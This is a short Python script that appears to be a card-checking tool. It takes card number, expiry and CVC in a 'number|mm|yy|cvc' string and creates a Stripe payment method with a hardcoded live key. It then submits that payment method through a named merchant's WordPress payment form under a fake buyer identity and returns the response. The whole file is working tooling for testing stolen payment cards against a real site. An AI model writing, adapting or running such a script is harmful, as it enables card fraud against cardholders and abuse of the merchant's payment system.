import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Ffbca98d0bf%3B+stripe-js-v3%2Ffbca98d0bf%3B+card-element&key=pk_live_51NWQGlD8rKVUbu4JczGiP8lFZYXnatYBtjzlZkndtBLJJmdX2JE2mzyz9iysizh7oE3ZaD6CKAUrkf2twKRFyI1D00SMm5RKlW'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_tccl_visitor': 'dd0e074f-40ce-4938-94d2-ab40b8d71446',
	    '_tccl_visit': 'dd0e074f-40ce-4938-94d2-ab40b8d71446',
	    '_scc_session': 'pc=1&C_TOUCH=2025-03-25T17:20:27.781Z',
	    '__stripe_mid': '540114b8-6d2d-478c-b865-876a01cf46ed31ee54',
	    '__stripe_sid': '0f0f5ee9-68f1-4542-ae4c-05d58de3bff06add2e',
	}
	
	headers = {
	    'authority': 'parpagroup.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_tccl_visitor=dd0e074f-40ce-4938-94d2-ab40b8d71446; _tccl_visit=dd0e074f-40ce-4938-94d2-ab40b8d71446; _scc_session=pc=1&C_TOUCH=2025-03-25T17:20:27.781Z; __stripe_mid=540114b8-6d2d-478c-b865-876a01cf46ed31ee54; __stripe_sid=0f0f5ee9-68f1-4542-ae4c-05d58de3bff06add2e',
	    'origin': 'https://parpagroup.com',
	    'referer': 'https://parpagroup.com/items-4-sale/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1742923289831',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=178&_fluentform_6_fluentformnonce=b314e9d7be&_wp_http_referer=%2Fitems-4-sale%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser20%40gmail.com&address_1%5Baddress_line_1%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&yearly_cards=1&yearly_card_qty=1&lifetime_cards=2&lifetime_card_qty=&inside_window=1&inside_window_qty=&lapel_pins=3&lapel_pins_qty=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '6',
	}
	
	r2 = requests.post(
	    'https://parpagroup.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
